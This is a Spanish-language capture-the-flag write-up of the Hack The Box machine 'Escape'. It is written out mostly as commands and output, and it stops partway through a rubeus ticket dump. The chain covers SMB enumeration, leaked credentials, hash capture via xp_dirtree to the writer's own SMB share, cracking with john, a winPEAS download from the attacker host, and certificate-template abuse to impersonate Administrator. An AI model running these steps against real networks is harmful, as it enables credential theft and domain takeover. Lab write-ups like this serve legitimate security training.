---
layout: post
title: Escape
date: 2023-06-21
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Escape-htb/Escape.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración por SMB

* Information Disclosure

* Obtención de hash NetNTMLv2 a través de xp_dirtree

* Credenciales en LOGs

* Enumeración de certificados (Escalada de Privilegios)

* Obtención hash NT (Escalada de Privilegios)

* PassTheHash (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.202 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 15:14 GMT
Nmap scan report for 10.10.11.202
Host is up (0.18s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49711/tcp open  unknown
49719/tcp open  unknown
50707/tcp open  unknown
57314/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.20 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49711,49719,50707,57314 10.10.11.202 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-24 15:16 GMT
Nmap scan report for 10.10.11.202
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-24 23:16:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-24T23:18:06+00:00; +7h59m59s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-24T23:18:05+00:00; +7h59m58s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.202:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2023-05-24T23:18:06+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-05-24T13:28:27
|_Not valid after:  2053-05-24T13:28:27
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-24T23:18:06+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-05-24T23:18:05+00:00; +7h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49719/tcp open  msrpc         Microsoft Windows RPC
50707/tcp open  msrpc         Microsoft Windows RPC
57314/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-time: 
|   date: 2023-05-24T23:17:26
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.36 seconds
```

Añado el dominio ```sequel.htb``` y el subdominio ```dc.sequel.htb``` al ```/etc/hosts```

## Puerto 445 (SMB)

Con ```crackmapexec``` aplico un escaneo para ver el dominio, hostname y versiones

```null
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

Listo los recursos compartidos a nivel de red

```null
smbmap -H 10.10.11.202 -u 'null'
                                                                                                    
[+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Public                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
```

Tengo acceso a ```public```

```null
smbmap -H 10.10.11.202 -u 'null' -r 'public'
                                                                                                    
[+] IP: 10.10.11.202:445	Name: dc.sequel.htb       	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	public                                            	READ ONLY	
	.\public\\*
	dr--r--r--                0 Sat Nov 19 11:51:25 2022	.
	dr--r--r--                0 Sat Nov 19 11:51:25 2022	..
	fr--r--r--            49551 Sat Nov 19 11:51:25 2022	SQL Server Procedures.pdf
```

Descargo el PDF

```null
smbmap -H 10.10.11.202 -u 'null' --download 'Public/SQL Server Procedures.pdf'
[+] Starting download: Public\SQL Server Procedures.pdf (49551 bytes)
[+] File output to: /home/rubbx/Desktop/HTB/Machines/Escape/10.10.11.202-Public_SQL Server Procedures.pdf
```

```null
mv 10.10.11.202-Public_SQL\ Server\ Procedures.pdf SQL_Server_Procedures.pdf
```

Contiene lo siguiente

<img src="/writeups/assets/img/Escape-htb/1.png" alt="">

<img src="/writeups/assets/img/Escape-htb/2.png" alt="">

El texto indica que en el último año hemos experimentado varios accidentes con nuestros servidores de SQL. Se menciona específicamente a Ryan por haber creado una instancia en el centro de datos, lo cual es cuestionado, ya que no se entiende por qué se colocaría una instancia de prueba en ese lugar. Debido a estos problemas, Tom ha decidido escribir un procedimiento básico que explique cómo acceder y probar cualquier cambio en la base de datos. Es importante destacar que todas estas acciones no se realizarán en el servidor en vivo, sino que se ha creado una réplica del centro de datos en un servidor dedicado.

Se menciona que Tom eliminará la instancia del centro de datos una vez que regrese de sus vacaciones. Además, se explica que el propósito principal de este documento es servir como una guía para los juniores cuando no haya un senior disponible para ayudarlos.

Proporcionan un enlace para descargar ```Microsoft Server Management Studio```. Al final del documento se leakean credenciales en texto claro

Es válida por SMB

```null
crackmapexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1'
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
```

Me puedo conectar a la base de datos

```null
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

Cargo un recurso compartido a nivel de red alojado de mi lado para obtener un hash NetNTLMv2

```null
SQL> xp_dirtree '\\10.10.16.40\shared\test'
```

```null
impacket-smbserver shared $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,64963)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:99fbf14f77d1095397eee8531d2ce8c4:01010000000000000055d6d5588ed90141b94fc6a5614106000000000100100048006c00560047006f007400410050000300100048006c00560047006f0074004100500002001000660043004600480056004e007100770004001000660043004600480056004e0071007700070008000055d6d5588ed9010600040002000000080030003000000000000000000000000030000071cf0c5c8909dcf9781152fe51aab1095987d639e0ea500439c467e35bb555bc0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340030000000000000000000
[*] Closing down connection (10.10.11.202,64963)
[*] Remaining connections []
```

La crackeo con ```john```

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:05 DONE (2023-05-24 16:02) 0.1851g/s 1981Kp/s 1981Kc/s 1981KC/s RENZOH..REDMAN36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Es válida por ```WINRM```, por lo que puedo ganar acceso a la máquina

```null
crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

```null
evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```

Encuentro un ```LOG``` en el directorio ```SQLServer```

```null
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

Entre todos los datos, se puede intuir que el usuario escribio la contraseña en el campo de usuario

```null
2022-11-18 13:43:07.44 Logon       Logon failed for user '.sequelhtb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

Es válida por ```WINRM```

```null
evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```

Puedo ver la primera flag

```null
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
90f9213c9536c861e877263f68a40cb6
```

# Escalada

Subo el ```winpeas.exe``` para aplicar reconocimiento

```null
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.40/winpeas.exe -o winpeas.exe
```

Encuentra un certificado

```null
DC\rubbx authenticated successfully
:::aaaaaaaaaaaaaaaa:c21c213b803f4b22178f416bafab990a:0101000000000000801906615e8ed90158bcc9442710435200000000010010005a004d0077006c0050004a0076004400030010005a004d0077006c0050004a0076004
  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : 
  ValidDate          : 11/18/2022 1:05:34 PM
  ExpiryDate         : 11/18/2023 1:05:34 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2

  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
       Smart Card Logon
       KDC Authentication
   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
  ValidDate          : 11/18/2022 12:58:46 PM
  ExpiryDate         : 11/18/2121 1:08:46 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56

   =================================================================================================

  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
  Subject            : CN=dc.sequel.htb
  ValidDate          : 11/18/2022 1:20:35 PM
  ExpiryDate         : 11/18/2023 1:20:35 PM
  HasPrivateKey      : True
  StoreLocation      : LocalMachine
  KeyExportable      : True
  Thumbprint         : 742AB4522191331767395039DB9B3B2E27B6F7FA

  Template           : DomainController
  Enhanced Key Usages
       Client Authentication     [*] Certificate is used for client authentication!
       Server Authentication
   =================================================================================================
```

Subo el ```certify.exe``` para analizarlo más a fondo

```null
*Evil-WinRM* PS C:\Temp> .\certify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.8164721
```

Teniendo un template vulnerable, puedo extraer la clave privada. En este [artículo](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin) está detallado paso a paso

```null
*Evil-WinRM* PS C:\Temp> .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAu3KYqvW78KPRXBbg3L/+vu2OxusobbNXdnWhq4+hzUOClyLE
A0FeCE/FaYYwvwmQQi/LHanSACOOALJeZAQFeniPIWJIqIBYbzl7Z6t6VDOH5N5Y
rEjEzuiRkk6SuHd3HHAtLfU61aOY8JhRCEk9Ud8IjGFrcYXF4U7dCmoaD9yP2Kdi
Iszk7bGWyHLWzdcv6oH9wZP4ZtKZer6c7j5skonVbR5E1+2GPjgK2CF4+YzLnT8N
cUplL8xyZqP62JaHytO0OJ9W8BnI2lVe9qFxfQaXrqMzbCsbcZOV7jbI7at1+GBa
j+eg4rZlsidiOvwRWxD2b2T0HcsCNRz5qH8qtQIDAQABAoIBAC2mArffkB1SR7H9
gFVCDG/CunqG2hmdCze1/eEh4W1ze2IC/WktihDMHG9OVqCvW4pCyVw39wRBpFtX
FNWWhR8GLRUcMkWWu/KaNQtSH0BSLE34N+/86LDawli2+dQig8dRKi9/AQz2AlDV
RyaVb3F4t0Q4lUnYIhB0fDAFFsO1sC2Rjj1v8uk66DPbj3hlSDbcYVrPNGRbqHFK
efvfaqHFAS59X7f4eKfzxHlv33oNE1zqU8twRTMqZNJ3e3ZsOru2+tpiLXEPcGPd
qyogcqHkDsj9tmf8p9l4cMcHx4T/axtdaiVFpaBldj4Qz8VbP8HHmQE0MsEO/Lol
WJ9xziECgYEA41dVLLm74u84gzEC54dr1WiDwNmSRdtus7RrsD3l1uuRfZIkrlB0
NFEQ+xZi8rrzE9ufKj7EXTYpl8vPxWqlgLbm5UfiC0uIbsb5byNL759vgisF2CE4
kyOunT/Sd7dXWHlpkSWlsw/BkEbTjm/Tnjw50jSQ1iUE1JMynZbdUkMCgYEA0xPV
7tmiATSH8FK5qm6B7aATJpdphZM3jMTdljoj3mQe65/4djwlhDipnwH2lf9D6aQl
19AJSwgkliHA3ZA1Rpj3WogTyVhlL60/NWDxNmAdCkTsBuUC9cq+89BCdrvMm1WC
DgYK1TfEWalSUnnBEcXLzfxAvcZxx1e2eT/J66cCgYEAldXng1Te6pD0VDMnUOXG
Qp9hxucfKv+XFMXi/AOvylj0SSjbGDBahmivom18xbJFp17mpnc8AJtECpH/3IOP
lSf3QkKATyV3RFvL5l4DHGmemtI0ReCPYxrvaSC5XMHvxZYv58RCU6Qc1TR5FrXJ
ac8T5OFUXG+FoX1qrMbUE/UCgYBIiZaJgK0V8PGOez9m/JcWDF7IclxHFTKP48+q
osxUzt95Zf5C06So7bgM9uXA4np6Pnjq04l+CYxZM7xN6BMG8eZ/bCgwl3oeilEg
jPIYF6ujLdBXBjigM06wBy/wEdXcw+Pv4c+zOnj1vySVR1Y8P1cssLWnAh1zvgbt
YCiKHQKBgBpTZCB1jOtbXaeQgRzSnWadm2pIdFKQ/Vjsc1aEacN6Q1pAYzcOaRjN
AsdBIM33AzpvcZl7N3z5cF2ItGyuN8ILKmQzGtVvKqyj59YWvV9bAzRpS8uupJIS
XPOelWaBNt9tDU/e8bN1ahO6aZtAiwFPgwfOEw+rAie8Io3KUupW
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAqZSIUcRBXTuwAAAAAACjANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNTI1MDA0MjUyWhcNMjUwNTI1
MDA1MjUyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7cpiq9bvwo9FcFuDcv/6+7Y7G
6yhts1d2daGrj6HNQ4KXIsQDQV4IT8VphjC/CZBCL8sdqdIAI44Asl5kBAV6eI8h
YkiogFhvOXtnq3pUM4fk3lisSMTO6JGSTpK4d3cccC0t9TrVo5jwmFEIST1R3wiM
YWtxhcXhTt0KahoP3I/Yp2IizOTtsZbIctbN1y/qgf3Bk/hm0pl6vpzuPmySidVt
HkTX7YY+OArYIXj5jMudPw1xSmUvzHJmo/rYlofK07Q4n1bwGcjaVV72oXF9Bpeu
ozNsKxtxk5XuNsjtq3X4YFqP56DitmWyJ2I6/BFbEPZvZPQdywI1HPmofyq1AgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIqqFvkhFn8rPXg/H01poeslOtOy
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAWd3zA1086RTy553C4k6A9vndeEKfjOR3NVW582E1fySXA9qakI+1+4QD
MorInfq4FSL7cs+u7wsOe1UTxtUs4dBQ8+t3VHGGuu2qM/xtxtA7VX+1hiHxhv9W
dkrSnaqDAPnCLoMZXLZrOWLr+re4rPYVEZbBN7bYolIji6pQRm5OH0gDqihJyvDM
eyAX1UJjJjkhCe3tXTQhTbqAHFM15GfMOuvJyFzip4Lhs1rbUkQLFev+8ONlLgwm
VehJxvAR+COfokykYbA/mDlOkplIykP/r9D4fJoS+OQp1zlZ4kv/kPV7T38xr82A
SZ85N6Vxt7HIVdZSYHkZXCfOXn0g7w==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:14.1491681
```

El propio ```certify.exe``` comparte el comando que hay que ejecutar para desencriptar la clave. Copio ambas a archivos en mi kali, el certificado y la clave, en un mismo archivo llamado ```cert.pem```

```null
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
```

Transifiero el certificado PFX a la máquina víctima, junto al ```rubeus.exe```. Ahora me puedo autenticar por Kerberos proporcionado el certificado como credencial para así obtener un hash NTLM y hacer PassTheHash como el usuario Administrador

```null
*Evil-WinRM* PS C:\Temp> .\rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::6431:6a5a:db1b:9a0d%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBHzcU44HWszm
      qL9FvvFp5mx+8g7ltBcD328hUnJD+dr99SdY5iHZ6Sdns8itWpU1iyS3MvOG9jMjRnY4zLfA+J2LqigD
      hkSQI+grlkHiqeHQfrJywNMVyna7Z97loTH80I6GcNtlyLNKEVQg7O7Yqfa3n2VUiptSPyL2LtfIvSYn
      48xN1wuTCUBm9HxUJSfUI8MaPdh0470s3VL0SGlxD0hMyeU7sUI7G1fEL+HZ+hsFUzTXcVzp2m21Lr5W
      aZNVSiXKt5BMM6Ta7nCbU7Bzagwj5lKtM3PEnRNV1EKwHnr8hnfTyiXWk8n79ii9CvWds6UklxhPq6Lj
